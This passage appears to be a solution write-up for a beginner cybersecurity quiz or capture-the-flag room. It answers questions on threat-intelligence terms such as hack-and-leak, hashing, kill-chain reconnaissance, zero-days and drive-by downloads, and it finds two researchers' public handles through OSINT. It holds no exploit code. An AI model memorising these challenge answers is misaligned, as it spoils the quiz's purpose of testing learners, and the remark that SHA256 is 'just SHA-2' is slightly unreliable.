aGVsbG8gd29ybGQ=
```

### 11: In this type of attack, attackers gain unauthorized access to information, then release that information to the public, often in an attempt to exert influence

> **Hint**: pack and peak.

_The **[Hack and Leak](https://www.kyberturvallisuuskeskus.fi/en/ajankohtaista/hack-and-leak)** phenomenon refers to instances where the objective of the attacker is to carry out a data breach of their target and then steal and utilise information critical to the victim. This can be considered a so-called hybrid attack._

### 12: This is a one-way cryptographic algorithm that converts an input of any length to an output of a fixed length.

[Hashing](https://www.wikiwand.com/en/Cryptographic_hash_function)

### 13: This is a cryptographic hashing function that outputs a value that is 256 bits long.

[SHA256](https://www.wikiwand.com/en/SHA-2) or just SHA-2.

### 14: This is the process of tracking and identifying the perpetrator of a cyber attack or intrusion.

**[Cyber attribution](https://www.american.edu/sis/centers/security-technology/the-evolution-of-cyber-attribution.cfm)** seeks to determine the responsibility for cyberspace operations. As with real world violence, the process of attribution includes both technical and political assessments. Technical methods include analyses of malware and routines that tie cyber effect operations to known actors.

### 15: This Twitter user, also known as "Hutch", co-authored the paper that introduced the kill chain to information security. (enter their @ username)

A bit of OSINT is required for this question. <br>

Searching for given paper I landed on [Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains](https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf)

Authors:
- Eric M. Hutchins
- Michael J. Cloppert
- Rohan M. Amin, Ph.D.
- Lockheed Martin Corporation

Searching for Eric I ended up on [Eric Hutchins](https://www.cyberwarcon.com/eric-hutchins).<br>
The website contains GitHub link, which contains twitter handle.

::: info Note
@ refers to Twitter (or X now...)
:::

### 16: This Twitter user is the Director of Intel at Red Canary and an instructor for SANS FOR578. (enter their @ username)

Googling the position lands us on a page about target, which includes their Twitter handle.

_**[Katie Nickels](https://www.atlanticcouncil.org/expert/katie-nickels)** is the director of intelligence for Red Canary as well as a SANS certified instructor for FOR578: Cyber Threat Intelligence._

### 17: In this type of attack, adversaries encrypt an organization's files and demand a payment in exchange for the decyption key

We already encountered this kind of attack in this project investigation. 

[Ransomware](https://www.imperva.com/learn/application-security/ransomware/)

### 18: In this type of attack, adversaries gain access to an organization's intellectual property or other sensitive data and threatens to release the data publicly unless the organization pays the adversary.

This kind of attack is called **[Extortion](https://www.imperva.com/blog/dont-be-a-victim-of-cyber-extortion/)**

### 19: This type of vulnerability is unknown to the people responsible for patching or fixing it

_A **[zero-day](https://www.imperva.com/learn/application-security/zero-day-exploit/)** (0day) exploit is a cyber attack targeting a software vulnerability which is unknown to the software vendor or to antivirus vendors. The attacker spots the software vulnerability before any parties interested in mitigating it, quickly creates an exploit, and uses it for an attack. Such attacks are highly likely to succeed because defenses are not in place. This makes zero-day attacks a severe security threat._

### 20: In this phase of the kill chain, attackers try to gather as much information as possible about their victims

**Reconnaissance** is like gathering information before making a move. In the cyber world, it's the first step where attackers or defenders collect data about a target. There are two types: passive (sneaky, like looking at public info) and active (more direct, like scanning networks). The collected info helps attackers find weaknesses, while defenders use tools to spot and stop these activities, protecting their systems.

### 21: Attackers use this technique to probe victim infrastructure for vulnerabilities via network traffic

In **Network Scanning** method, attackers send specific network traffic to a target system to identify vulnerabilities or weaknesses. The goal is to explore the target's network, discover open ports, services, and potential entry points. Network scanning provides attackers with valuable information for planning and executing further stages of an attack. Defenders use security measures like firewalls and intrusion detection systems to detect and block such scanning activities and protect their networks.

The most popular tool being **[nmap](https://nmap.org)**, but I would recommend checking out **[RustScan](https://github.com/RustScan/RustScan)**.

### 22: This data source can be used to get additional information about registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system.

_[WHOIS](https://www.wikiwand.com/en/WHOIS) (pronounced as the phrase "who is") is a query and response protocol that is used for querying databases that store an Internet resource's registered users or assignees. These resources include domain names, IP address blocks and autonomous systems, but it is also used for a wider range of other information._

### 23: In this type of attack, adversaries compromise a legitimate website and add malicious code in an attempt to target users who visit that site.

_In a **[Drive-by](https://www.imperva.com/learn/application-security/drive-by-downloads/)**-Download attack, the web application is tampered (i.e. injected with HTML code) that instructs a visitor’s browser to download malware located in an attacker’s controlled server._